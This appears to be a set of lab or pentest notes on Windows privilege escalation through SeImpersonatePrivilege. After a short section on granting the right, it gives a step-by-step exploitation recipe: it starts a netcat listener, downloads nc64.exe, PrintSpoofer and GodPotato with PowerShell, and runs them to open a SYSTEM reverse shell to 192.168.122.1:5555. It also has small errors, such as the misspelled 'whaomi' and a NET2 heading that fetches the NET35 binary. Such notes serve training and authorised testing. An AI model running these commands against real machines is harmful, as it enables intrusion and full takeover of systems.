## Windows Setup

Assign the **SeImpersonatePrivilege** to the new user:

1. Go to "Edit Group Policy"
2. Computer Configuration
3. Windows Settings
4. Security Settings
5. Local Policies
6. User Rights Assignment
7. Impersonate a client after authentication
8. Right click on "Properties"
9. Add user or group

## SeImpersonatePrivilege

When you assign the "Impersonate a client after authentication" user right to a user, you permit programs that run on behalf of that user to impersonate a client.

An attacker with SeImpersonatePrivilege could create a service, mislead a client into connecting to the service, and then impersonate that computer to elevate the attacker's level of access to that of the device.

## Exploitation

Check you have the privilege@
```powershell
whaomi /priv
```

You're looking for the **SeImpersonatePrivilege** state to be **Enabled**

Various exploits can be used
- PrintSpoofer
- GodPotato

In all cases, we first have to start up a local listener:
```sh
nc -lvnp 5555
```

Download ncat on the remote machine:
```powershell
iwr -uri "https://raw.githubusercontent.com/int0x33/nc.exe/master/nc64.exe" -Outfile nc64.exe
```

---

**PrintSpoofer**

Download exploit on Windows:

32 bit
```powershell
iwr -uri "https://github.com/itm4n/PrintSpoofer/releases/download/v1.0/PrintSpoofer32.exe" -Outfile PrintSpoofer32.exe
```

64 bit
```powershell
iwr -uri "https://github.com/itm4n/PrintSpoofer/releases/download/v1.0/PrintSpoofer64.exe" -Outfile PrintSpoofer64.exe
```

Execute exploit:
```powershell
PrintSpoofer64.exe -c "C:\Users\leonardo\Desktop\nc64.exe 192.168.122.1 5555 -e cmd"
```

Understand the version of `.NET` with the following command and use the relative exploit:
```powershell
reg query "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\NET Framework Setup\NDP"
```

---

**GodPotato-NET2**

Download exploit on Windows:
```powershell
iwr -uri "https://github.com/BeichenDream/GodPotato/releases/download/V1.20/GodPotato-NET35.exe" -Outfile GodPotato-NET35.exe
```

Execute exploit:
```powershell
.\GodPotato-NET35.exe -cmd "C:\Users\leonardo\Desktop\nc64.exe 192.168.122.1 5555 -e cmd"
```

**GodPotato-NET35**

Download exploit on Windows:
```powershell
iwr -uri "https://github.com/BeichenDream/GodPotato/releases/download/V1.20/GodPotato-NET35.exe" -Outfile GodPotato-NET35.exe
```

Execute exploit:
```powershell
.\GodPotato-NET35.exe -cmd "C:\Users\leonardo\Desktop\nc64.exe 192.168.122.1 5555 -e cmd"
```

**GodPotato-NET4**

Download exploit on Windows:
```powershell
iwr -uri "https://github.com/BeichenDream/GodPotato/releases/download/V1.20/GodPotato-NET4.exe" -Outfile GodPotato-NET4.exe
```

Execute exploit:
```powershell
.\GodPotato-NET4.exe -cmd "C:\Users\leonardo\Desktop\nc64.exe 192.168.122.1 5555 -e cmd"
```

---
## References 

on SeImpersonatePrivileg
- https://learn.microsoft.com/en-us/troubleshoot/windows-server/windows-security/seimpersonateprivilege-secreateglobalprivilege
- https://juggernaut-sec.com/seimpersonateprivilege/
- https://foxglovesecurity.com/2016/09/26/rotten-potato-privilege-escalation-from-service-accounts-to-system/

PrintSpoofer exploit
- https://github.com/itm4n/PrintSpoofer
- https://github.com/itm4n/PrintSpoofer/releases/download/v1.0/PrintSpoofer64.exe

GodPotato exploit
- https://github.com/BeichenDream/GodPotato




